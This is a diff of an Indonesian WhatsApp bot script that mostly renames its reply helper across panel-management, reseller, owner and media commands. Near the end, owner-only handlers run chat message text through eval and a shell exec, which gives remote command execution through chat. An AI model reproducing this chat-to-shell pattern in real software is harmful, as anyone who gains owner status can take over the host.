@@ -36265,21 +36238,21 @@ case 'cekplatnomor': {
         '',
         '⚠️ Fitur tanpa API ini hanya memeriksa pola tulisan dan pemetaan kode wilayah lokal. Fitur ini TIDAK memverifikasi registrasi kendaraan, pemilik, pajak, atau status hukum kendaraan.'
     ]
-    await Reply(details.join('\n'))
+    await replyV1(details.join('\n'))
 }
 break
 
 case 'cekerror':
 case 'analisisscript':
 case 'diagnosisscript': {
-    if (!isCreator) return Reply(mess.owner)
-    await Reply('🔎 Pemeriksaan sintaks dan referensi lokal dimulai. Folder node_modules, sesi, cache, dan berkas runtime dikecualikan.')
+    if (!isCreator) return replyV1(mess.owner)
+    await replyV1('🔎 Pemeriksaan sintaks dan referensi lokal dimulai. Folder node_modules, sesi, cache, dan berkas runtime dikecualikan.')
     try {
         const report = await indonesiaTools.diagnoseProject(__dirname)
-        await Reply(indonesiaTools.formatDiagnostics(report))
+        await replyV1(indonesiaTools.formatDiagnostics(report))
     } catch (error) {
         console.error('[SCRIPT DIAGNOSTICS]', error?.stack || error)
-        await Reply(`❌ Pemeriksaan script gagal dijalankan.\n${String(error?.message || error).slice(0, 260)}`)
+        await replyV1(`❌ Pemeriksaan script gagal dijalankan.\n${String(error?.message || error).slice(0, 260)}`)
     }
 }
 break
@@ -36288,7 +36261,7 @@ case "tourl": {
     const mediaMessage = qmsg || m.quoted
     const mediaMime = String((mediaMessage?.msg || mediaMessage)?.mimetype || mime || '').split(';')[0].trim().toLowerCase()
     if (!mediaMessage || !mediaMime || mediaMime === 'application/octet-stream') {
-        return Reply(`Kirim atau reply gambar, video, audio, atau dokumen dengan caption ${prefix}tourl.`)
+        return replyV1(`Kirim atau reply gambar, video, audio, atau dokumen dengan caption ${prefix}tourl.`)
     }
     let temporaryMedia = null
     try {
@@ -36317,7 +36290,7 @@ case "tourl": {
         await conn.sendMessage(m.chat, { text: resultText }, { quoted: m })
     } catch (error) {
         console.error('[TOURL]', error?.stack || error)
-        await Reply(`❌ Gagal mengunggah media ke penyedia URL.\n${String(error?.message || error).slice(0, 850)}`)
+        await replyV1(`❌ Gagal mengunggah media ke penyedia URL.\n${String(error?.message || error).slice(0, 850)}`)
     } finally {
         if (temporaryMedia) {
             try { if (fs.existsSync(temporaryMedia)) fs.unlinkSync(temporaryMedia) }
@@ -36330,8 +36303,8 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "cadmin": {
-if (!isCreator) return Reply(mess.owner)
-if (!text) return Reply(example("username"))
+if (!isCreator) return replyV1(mess.owner)
+if (!text) return replyV1(example("username"))
 let username = text.toLowerCase()
 let email = username+"@gmail.com"
 let name = capital(args[0])
@@ -36354,12 +36327,12 @@ let f = await fetch(domain + "/api/application/users", {
 })
 })
 let data = await f.json();
-if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
+if (data.errors) return replyV1(JSON.stringify(data.errors[0], null, 2))
 let user = data.attributes
 var orang
 if (m.isGroup) {
 orang = m.sender
-await Reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
+await replyV1("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
 } else {
 orang = m.chat
 }
@@ -36398,8 +36371,8 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "cadmin-v2": {
-if (!isCreator) return Reply(mess.owner)
-if (!text) return Reply(example("username"))
+if (!isCreator) return replyV1(mess.owner)
+if (!text) return replyV1(example("username"))
 let username = text.toLowerCase()
 let email = username+"@gmail.com"
 let name = capital(args[0])
@@ -36422,12 +36395,12 @@ let f = await fetch(domainV2 + "/api/application/users", {
 })
 })
 let data = await f.json();
-if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
+if (data.errors) return replyV1(JSON.stringify(data.errors[0], null, 2))
 let user = data.attributes
 var orang
 if (m.isGroup) {
 orang = m.sender
-await Reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
+await replyV1("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
 } else {
 orang = m.chat
 }
@@ -36465,21 +36438,21 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "addseller": {
-if (!isCreator) return Reply(mess.owner)
-if (!text && !m.quoted) return Reply(example("6285###"))
+if (!isCreator) return replyV1(mess.owner)
+if (!text && !m.quoted) return replyV1(example("6285###"))
 const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 const input2 = input.split("@")[0]
-if (input2 === global.owner || premium.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller!`)
+if (input2 === global.owner || premium.includes(input) || input === botNumber) return replyV1(`Nomor ${input2} sudah menjadi reseller!`)
 premium.push(input)
 await fs.writeFileSync(projectPath('library', 'database', 'premium.json'), JSON.stringify(premium, null, 2))
-Reply(`Berhasil menambah reseller ✅`)
+replyV1(`Berhasil menambah reseller ✅`)
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "listseller": {
-if (premium.length < 1) return Reply("Tidak ada user reseller")
+if (premium.length < 1) return replyV1("Tidak ada user reseller")
 let teks = `\n *乂 List all reseller panel*\n`
 for (let i of premium) {
 teks += `\n* ${i.split("@")[0]}
@@ -36492,24 +36465,24 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "delseller": {
-if (!isCreator) return Reply(mess.owner)
-if (!m.quoted && !text) return Reply(example("6285###"))
+if (!isCreator) return replyV1(mess.owner)
+if (!m.quoted && !text) return replyV1(example("6285###"))
 const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 const input2 = input.split("@")[0]
-if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner!`)
-if (!premium.includes(input)) return Reply(`Nomor ${input2} bukan reseller!`)
+if (input2 == global.owner || input == botNumber) return replyV1(`Tidak bisa menghapus owner!`)
+if (!premium.includes(input)) return replyV1(`Nomor ${input2} bukan reseller!`)
 let posi = premium.indexOf(input)
 await premium.splice(posi, 1)
 await fs.writeFileSync(projectPath('library', 'database', 'premium.json'), JSON.stringify(premium, null, 2))
-Reply(`Berhasil menghapus reseller ✅`)
+replyV1(`Berhasil menghapus reseller ✅`)
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
-if (!isCreator && !isPremium) return Reply(mess.owner)
-if (!args[0]) return Reply('Contoh: .5gb-v2 username')
+if (!isCreator && !isPremium) return replyV1(mess.owner)
+if (!args[0]) return replyV1('Contoh: .5gb-v2 username')
 let username = args[0].toLowerCase()
 var ram
 var disknya
@@ -36579,7 +36552,7 @@ let f = await fetch(domainV2 + "/api/application/users", {
 })
 })
 let data = await f.json();
-if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
+if (data.errors) return replyV1(JSON.stringify(data.errors[0], null, 2))
 let user = data.attributes
 let desc = tanggal(Date.now())
 let usr_id = user.id
@@ -36633,12 +36606,12 @@ port_range: [],
 })
 })
 let result = await f2.json()
-if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
+if (result.errors) return replyV1(JSON.stringify(result.errors[0], null, 2))
 let server = result.attributes
 var orang
 if (m.isGroup) {
 orang = m.sender
-await Reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
+await replyV1("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
 } else {
 orang = m.chat
 }
@@ -36669,7 +36642,7 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "listadmin-v2": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 let cek = await fetch(domainV2 + "/api/application/users?page=1", {
 "method": "GET",
 "headers": {
@@ -36680,7 +36653,7 @@ let cek = await fetch(domainV2 + "/api/application/users?page=1", {
 })
 let res2 = await cek.json();
 let users = res2.data;
-if (users.length < 1 ) return Reply("Tidak ada admin panel")
+if (users.length < 1 ) return replyV1("Tidak ada admin panel")
 var teks = "\n *乂 List admin panel pterodactyl*\n"
 await users.forEach((i) => {
 if (i.attributes.root_admin !== true) return
@@ -36707,7 +36680,7 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "listpanel-v2": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 let f = await fetch(domainV2 + "/api/application/servers?page=1", {
 "method": "GET",
 "headers": {
@@ -36718,7 +36691,7 @@ let f = await fetch(domainV2 + "/api/application/servers?page=1", {
 })
 let res = await f.json();
 let servers = res.data;
-if (servers.length < 1) return Reply("Tidak Ada Server Bot")
+if (servers.length < 1) return replyV1("Tidak Ada Server Bot")
 let messageText = "\n  *乂 List server panel pterodactyl*\n"
 for (let server of servers) {
 let s = server.attributes
@@ -36759,7 +36732,7 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "deladmin-v2": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 if (!text) {
 let cek = await fetch(domainV2 + "/api/application/users?page=1", {
 "method": "GET",
@@ -36771,7 +36744,7 @@ let cek = await fetch(domainV2 + "/api/application/users?page=1", {
 })
 let res2 = await cek.json();
 let users = res2.data;
-if (users.length < 1 ) return Reply("Tidak ada admin panel")
+if (users.length < 1 ) return replyV1("Tidak ada admin panel")
 let list = []
 await users.forEach((i) => {
 if (i.attributes.root_admin !== true) return
@@ -36839,15 +36812,15 @@ errors: null
 } : await delusr.json()
 }
 })
-if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!")
-await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
+if (idadmin == null) return replyV1("Akun admin panel tidak ditemukan!")
+await replyV1(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "delpanel-v2": {
-if (!isCreator && !isPremium) return Reply(mess.owner)
+if (!isCreator && !isPremium) return replyV1(mess.owner)
 if (!text) {
 let list = []
 let f = await fetch(domainV2 + "/api/application/servers?page=1", {
@@ -36860,7 +36833,7 @@ let f = await fetch(domainV2 + "/api/application/servers?page=1", {
 })
 let res = await f.json();
 let servers = res.data;
-if (servers.length < 1) return Reply("Tidak Ada Server Bot")
+if (servers.length < 1) return replyV1("Tidak Ada Server Bot")
 for (let server of servers) {
 let s = server.attributes
 let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
@@ -36964,15 +36937,15 @@ let res = delusr.ok ? {
 errors: null
 } : await delusr.json()
 }}
-if (sections == undefined) return Reply("Server panel tidak ditemukan!")
-Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
+if (sections == undefined) return replyV1("Server panel tidak ditemukan!")
+replyV1(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "listadmin": {
-if (!isCreator && !isAdmins) return Reply(mess.owner)
+if (!isCreator && !isAdmins) return replyV1(mess.owner)
 let cek = await fetch(domain + "/api/application/users?page=1", {
 "method": "GET",
 "headers": {
@@ -36983,7 +36956,7 @@ let cek = await fetch(domain + "/api/application/users?page=1", {
 })
 let res2 = await cek.json();
 let users = res2.data;
-if (users.length < 1 ) return Reply("Tidak ada admin panel")
+if (users.length < 1 ) return replyV1("Tidak ada admin panel")
 var teks = " *乂 List admin panel pterodactyl*\n"
 await users.forEach((i) => {
 if (i.attributes.root_admin !== true) return
@@ -37010,7 +36983,7 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "listpanel": case "listp": case "listserver": {
-if (!isCreator && !isPremium) return Reply(mess.owner)
+if (!isCreator && !isPremium) return replyV1(mess.owner)
 let f = await fetch(domain + "/api/application/servers?page=1", {
 "method": "GET",
 "headers": {
@@ -37021,7 +36994,7 @@ let f = await fetch(domain + "/api/application/servers?page=1", {
 })
 let res = await f.json();
 let servers = res.data;
-if (servers.length < 1) return Reply("Tidak Ada Server Bot")
+if (servers.length < 1) return replyV1("Tidak Ada Server Bot")
 let messageText = "\n  *乂 List server panel pterodactyl*\n"
 for (let server of servers) {
 let s = server.attributes
@@ -37062,7 +37035,7 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "deladmin": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 if (!text) {
 let cek = await fetch(domain + "/api/application/users?page=1", {
 "method": "GET",
@@ -37074,7 +37047,7 @@ let cek = await fetch(domain + "/api/application/users?page=1", {
 })
 let res2 = await cek.json();
 let users = res2.data;
-if (users.length < 1 ) return Reply("Tidak ada admin panel")
+if (users.length < 1 ) return replyV1("Tidak ada admin panel")
 let list = []
 await users.forEach((i) => {
 if (i.attributes.root_admin !== true) return
@@ -37142,15 +37115,15 @@ errors: null
 } : await delusr.json()
 }
 })
-if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!")
-await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
+if (idadmin == null) return replyV1("Akun admin panel tidak ditemukan!")
+await replyV1(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "delpanel": {
-if (!isCreator && !isPremium) return Reply(mess.owner)
+if (!isCreator && !isPremium) return replyV1(mess.owner)
 if (!text) {
 let list = []
 let f = await fetch(domain + "/api/application/servers?page=1", {
@@ -37163,7 +37136,7 @@ let f = await fetch(domain + "/api/application/servers?page=1", {
 })
 let res = await f.json();
 let servers = res.data;
-if (servers.length < 1) return Reply("Tidak Ada Server Bot")
+if (servers.length < 1) return replyV1("Tidak Ada Server Bot")
 for (let server of servers) {
 let s = server.attributes
 let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
@@ -37267,8 +37240,8 @@ let res = delusr.ok ? {
 errors: null
 } : await delusr.json()
 }}
-if (sections == undefined) return Reply("Server panel tidak ditemukan!")
-Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
+if (sections == undefined) return replyV1("Server panel tidak ditemukan!")
+replyV1(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
 }
 break
 
@@ -37393,28 +37366,28 @@ let respon = `
 *• Runtime Bot :* ${runtime(process.uptime())}
 `
 await conn.sendMessage(m.chat, { react: { text: '🏓', key: m.key } })
-await Reply(respon)
+await replyV1(respon)
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "public": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 conn.public = true
 if (conn.__xeryuuRole !== 'JADIBOT') {
     global.db.settings.whatsappMode = 'public'
     saveDB(global.db)
 }
-return Reply("✅ Mode bot diubah menjadi *PUBLIC*. Semua pengguna dapat menggunakan bot.")
+return replyV1("✅ Mode bot diubah menjadi *PUBLIC*. Semua pengguna dapat menggunakan bot.")
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "restart": case "rst": {
-if (!isCreator) return Reply(mess.owner)
-await Reply("Memproses _restart server_ . . .")
+if (!isCreator) return replyV1(mess.owner)
+await replyV1("Memproses _restart server_ . . .")
 var file = await fs.readdirSync(projectPath('session'))
 var anu = await file.filter(i => i !== "creds.json")
 for (let t of anu) {
@@ -37427,7 +37400,7 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "clearchat": case "clc": {
-if (!isCreator) return Reply(mess.owner)
+if (!isCreator) return replyV1(mess.owner)
 conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
 }
 break
@@ -37435,7 +37408,7 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "listowner": case "listown": {
-if (owners.length < 1) return Reply("Tidak ada owner tambahan")
+if (owners.length < 1) return replyV1("Tidak ada owner tambahan")
 let teks = `\n *乂 List all owner tambahan*\n`
 for (let i of owners) {
 teks += `\n* ${i.split("@")[0]}
@@ -37448,35 +37421,35 @@ break
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "delowner": case "delown": {
-if (!isCreator) return Reply(mess.owner)
-if (!m.quoted && !text) return Reply(example("6285###"))
+if (!isCreator) return replyV1(mess.owner)
+if (!m.quoted && !text) return replyV1(example("6285###"))
 const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 const input2 = input.split("@")[0]
-if (input2 === global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner utama!`)
-if (!owners.includes(input)) return Reply(`Nomor ${input2} bukan owner bot!`)
+if (input2 === global.owner || input == botNumber) return replyV1(`Tidak bisa menghapus owner utama!`)
+if (!owners.includes(input)) return replyV1(`Nomor ${input2} bukan owner bot!`)
 let posi = owners.indexOf(input)
 await owners.splice(posi, 1)
 await fs.writeFileSync(projectPath('library', 'database', 'owner.json'), JSON.stringify(owners, null, 2))
-Reply(`Berhasil menghapus owner ✅`)
+replyV1(`Berhasil menghapus owner ✅`)
 }
 break
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 case "addowner": case "addown": {
-if (!isCreator) return Reply(mess.owner)
-if (!m.quoted && !text) return Reply(example("6285###"))
+if (!isCreator) return replyV1(mess.owner)
+if (!m.quoted && !text) return replyV1(example("6285###"))
 const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 const input2 = input.split("@")[0]
-if (input2 === global.owner || owners.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi owner bot!`)
+if (input2 === global.owner || owners.includes(input) || input === botNumber) return replyV1(`Nomor ${input2} sudah menjadi owner bot!`)
 owners.push(input)
 await fs.writeFileSync(projectPath('library', 'database', 'owner.json'), JSON.stringify(owners, null, 2))
-Reply(`Berhasil menambah owner ✅`)
+replyV1(`Berhasil menambah owner ✅`)
 }
 
 
 case "cekjawa": {
-    if (!text) return Reply("Contoh penggunaan: .cekjawa XnalzNotDev");
+    if (!text) return replyV1("Contoh penggunaan: .cekjawa XnalzNotDev");
 
     let jawaban = [
         "🔥 Wah, *100% Jawa tulen* bro 😎, ngoko-ngokone kenceng!",
@@ -37504,7 +37477,7 @@ case "cekjawa": {
     let randomIndex = Math.floor(Math.random() * jawaban.length);
     let result = jawaban[randomIndex];
 
-    Reply(`Hasil *cekJawa* untuk *${text}*:\n${result}`);
+    replyV1(`Hasil *cekJawa* untuk *${text}*:\n${result}`);
 }
 break
 case "panduan": {
@@ -37548,7 +37521,7 @@ text: `📚 *Random Fact*\n\n${res.data.text}`
 
 } catch (e) {
 console.log(e)
-Reply("❌ gagal mengambil fakta")
+replyV1("❌ gagal mengambil fakta")
 }
 
 }
@@ -37557,9 +37530,9 @@ case "tiktokslide":
 case "ttslide": {
 try {
 
-if (!text) return Reply("contoh: .ttslide https://vt.tiktok.com/xxxxx")
+if (!text) return replyV1("contoh: .ttslide https://vt.tiktok.com/xxxxx")
 
-Reply("⏳ Tunggu sebentar, sedang mengambil slide TikTok...")
+replyV1("⏳ Tunggu sebentar, sedang mengambil slide TikTok...")
 
 const axios = require("axios")
 
@@ -37570,7 +37543,7 @@ url: text
 let data = res.data.data
 
 if (!data.images || data.images.length === 0) {
-return Reply("❌ Video ini bukan TikTok slide")
+return replyV1("❌ Video ini bukan TikTok slide")
 }
 
 const cards = await Promise.all(data.images.map(async (img, i) => ({
@@ -37626,7 +37599,7 @@ ptt:false
 } catch (err) {
 
 console.log("❌ ERROR TTSLIDE:", err)
-Reply("❌ gagal mengambil slide TikTok")
+replyV1("❌ gagal mengambil slide TikTok")
 
 }
 
@@ -37635,25 +37608,25 @@ break
 
 
 case "setppgc": {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
-    if (!m.quoted) return Reply(`Reply foto grup.
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
+    if (!m.quoted) return replyV1(`Reply foto grup.
 Contoh: ${prefix}setppgc`)
 
     const mime = (m.quoted.msg || m.quoted).mimetype || ''
     if (!/^image\//i.test(mime)) {
-        return Reply('❌ Pesan yang di-reply harus berupa gambar.')
+        return replyV1('❌ Pesan yang di-reply harus berupa gambar.')
     }
 
     try {
         const media = await m.quoted.download()
-        if (!media?.length) return Reply('❌ Gagal membaca foto.')
+        if (!media?.length) return replyV1('❌ Gagal membaca foto.')
         await conn.updateProfilePicture(m.chat, media)
-        return Reply('✅ Foto profil grup berhasil diganti.')
+        return replyV1('✅ Foto profil grup berhasil diganti.')
     } catch (err) {
         console.error('[SETPPGC ERROR]', err)
-        return Reply(`❌ Gagal mengganti foto grup.
+        return replyV1(`❌ Gagal mengganti foto grup.
 ${err?.message || err}`)
     }
 }
@@ -37754,15 +37727,15 @@ if (!isCreator) return
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-await Reply(evaled)
+await replyV1(evaled)
 } catch (err) {
-await Reply(String(err))
+await replyV1(String(err))
 }}
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 if (String(m?.text || body || '').toLowerCase() === "bot") {
-Reply("XnalzNotDev Md Online ada yang bisa saya bantu? ✅")
+replyV1("XnalzNotDev Md Online ada yang bisa saya bantu? ✅")
 }
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
@@ -37772,9 +37745,9 @@ if (!isCreator) return
 try {
 let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-await Reply(evaled)
+await replyV1(evaled)
 } catch (err) {
-await Reply(String(err))
+await replyV1(String(err))
 }}
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
@@ -37783,8 +37756,8 @@ if (budy.startsWith('$')) {
 if (!isCreator) return
 if (!text) return
 exec(budy.slice(2), (err, stdout) => {
-if (err) return Reply(`${err}`)
-if (stdout) return Reply(stdout)
+if (err) return replyV1(`${err}`)
+if (stdout) return replyV1(stdout)
 })
 }
 
